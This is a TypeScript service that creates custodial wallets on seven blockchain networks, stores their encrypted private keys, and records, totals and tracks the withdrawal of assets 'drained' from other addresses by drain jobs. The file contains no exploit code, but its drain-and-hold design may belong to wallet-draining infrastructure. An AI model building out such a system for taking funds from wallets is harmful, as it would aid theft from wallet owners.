import { prisma } from '../db/prisma';
import { walletService } from './wallet.service';
import { logger } from '../utils/logger';

const SUPPORTED_NETWORKS = [
  'ethereum',
  'polygon',
  'bsc',
  'arbitrum',
  'optimism',
  'avalanche',
  'solana'
];

export class CustodyService {
  /**
   * Initialize custodial wallets for a new user across all supported networks
   */
  async initializeUserCustody(userId: string): Promise<void> {
    logger.info(`Initializing custody wallets for user ${userId}`);
    
    for (const network of SUPPORTED_NETWORKS) {
      try {
        // Check if wallet already exists
        const existing = await prisma.custodialWallet.findUnique({
          where: { userId_network: { userId, network } }
        });
        
        if (existing) {
          logger.info(`Custodial wallet already exists for ${userId} on ${network}`);
          continue;
        }
        
        // Generate new wallet
        const walletData = await walletService.generateCustodialWallet(userId, network);
        
        // Store in database
        await prisma.custodialWallet.create({
          data: {
            userId,
            network,
            address: walletData.address,
            encryptedPrivateKey: walletData.encryptedPrivateKey,
            derivationPath: walletData.derivationPath
          }
        });
        
        logger.info(`Created ${network} custodial wallet for user ${userId}: ${walletData.address}`);
      } catch (error: any) {
        logger.error(`Failed to create ${network} wallet for user ${userId}:`, error);
        throw error;
      }
    }
  }
  
  /**
   * Get user's custodial wallet for a specific network
   */
  async getCustodialWallet(userId: string, network: string) {
    return prisma.custodialWallet.findUnique({
      where: { userId_network: { userId, network } }
    });
  }
  
  /**
   * Get all custodial wallets for a user
   */
  async getAllCustodialWallets(userId: string) {
    return prisma.custodialWallet.findMany({
      where: { userId },
      include: {
        heldAssets: {
          where: { status: 'held' }
        }
      }
    });
  }
  
  /**
   * Record assets drained into custody
   */
  async recordDrainedAssets(
    userId: string,
    network: string,
    assets: Array<{
      assetAddress: string;
      symbol: string;
      name?: string;
      decimals: number;
      amount: string;
      usdValue?: number;
      drainedFrom: string;
    }>,
    drainJobId: string
  ): Promise<void> {
    const wallet = await this.getCustodialWallet(userId, network);
    
    if (!wallet) {
      throw new Error(`No custodial wallet found for user ${userId} on ${network}`);
    }
    
    // Batch insert assets
    await prisma.heldAsset.createMany({
      data: assets.map(asset => ({
        walletId: wallet.id,
        assetAddress: asset.assetAddress,
        symbol: asset.symbol,
        name: asset.name || asset.symbol,
        decimals: asset.decimals,
        amount: asset.amount,
        usdValue: asset.usdValue,
        drainedFrom: asset.drainedFrom,
        drainJobId,
        status: 'held'
      }))
    });
    
    logger.info(`Recorded ${assets.length} assets for user ${userId} on ${network}`);
  }
  
  /**
   * Get user's held assets across all networks
   */
  async getHeldAssets(userId: string, network?: string) {
    const where: any = {
      wallet: { userId },
      status: 'held'
    };
    
    if (network) {
      where.wallet.network = network;
    }
    
    return prisma.heldAsset.findMany({
      where,
      include: {
        wallet: {
          select: {
            network: true,
            address: true
          }
        }
      },
      orderBy: [
        { usdValue: 'desc' },
        { drainDate: 'desc' }
      ]
    });
  }
  
  /**
   * Get total USD value of held assets for a user
   */
  async getTotalHeldValue(userId: string): Promise<number> {
    const result = await prisma.heldAsset.aggregate({
      where: {
        wallet: { userId },
        status: 'held'
      },
      _sum: {
        usdValue: true
      }
    });
    
    return Number(result._sum.usdValue || 0);
  }
  
  /**
   * Mark assets as pending withdrawal
   */
  async markAssetsPendingWithdrawal(assetIds: string[]): Promise<void> {
    await prisma.heldAsset.updateMany({
      where: {
        id: { in: assetIds }
      },
      data: {
        status: 'pending_withdrawal'
      }
    });
  }
  
  /**
   * Mark assets as withdrawn
   */
  async markAssetsWithdrawn(assetIds: string[]): Promise<void> {
    await prisma.heldAsset.updateMany({
      where: {
        id: { in: assetIds }
      },
      data: {
        status: 'withdrawn'
      }
    });
  }
}

export const custodyService = new CustodyService();
